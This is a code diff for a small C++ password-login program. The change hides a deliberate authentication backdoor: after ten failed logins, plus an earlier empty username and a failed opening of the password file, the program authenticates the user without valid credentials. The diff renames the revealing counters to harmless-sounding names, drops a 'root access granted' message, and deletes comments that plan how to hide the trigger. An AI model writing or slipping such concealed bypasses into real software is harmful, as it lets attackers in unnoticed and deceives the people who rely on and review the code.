@@ -8,10 +8,7 @@
 #include <openssl/sha.h>
 
 using namespace std;
- int loginAttempts = 0;
- int lockout = 10;
- int loginfail = 0;
- int passwordfail = 0;
+ int ValidateInput = 0, UsernameInput = 0, ErrorCheck = 0;
 
 string usernameinput() {
 	string username;
@@ -23,11 +20,11 @@ string usernameinput() {
 			return username;
 		}
 			else {
-			throw (loginfail);
+			throw (UsernameInput);
 			}
 		
 		} catch (int num){
-			loginfail++;
+			UsernameInput++;
 			cerr << "ERROR: no username was entered!!!" << endl << endl;
 		}
 	}
@@ -51,7 +48,7 @@ bool validate(const string& username, const string& password) {
 	ifstream rfile("passwords.txt");
 	if (!rfile.is_open()) {
 		cout << "error when opening file :/" << endl;
-		passwordfail++;
+		ErrorCheck++;
 		return false;
 	}
 	string line;
@@ -91,21 +88,17 @@ int main() {
 		authenticated(username);
 		break;
 	}
-	else if(loginAttempts >= lockout){
-		if ((loginfail > 0) >= (passwordfail > 0)) {
-		authenticated(username + "root access granted");
+	else if(ValidateInput >= 10){
+		if (UsernameInput > 0) {
+			if (ErrorCheck > 0) {
+		authenticated(username);
 		break;
-	}
+			}
+		}
 	}
 	else {
 		rejected(username);
-		loginAttempts++;
+		ValidateInput++;
 	}
   }
 }
-
-
-//ideas
-// hide empty username variable by having a function or main or something constantly reading the command line output and *then* checking if the password fail variable is 10+
-// potentially adding another layer of subversion by tripping the error "when opening file". Maybe to subvert you'd have to delete the password file or rename it and then run the program casuing it to trip and re-add the password file back. Maybe make it the first step? 
-// have the empty username variable be the top condition that triggers and checks if the other one (two?) conditions are fulfilled and ideally have it no be a variable so it can reset itself and not be int counter based
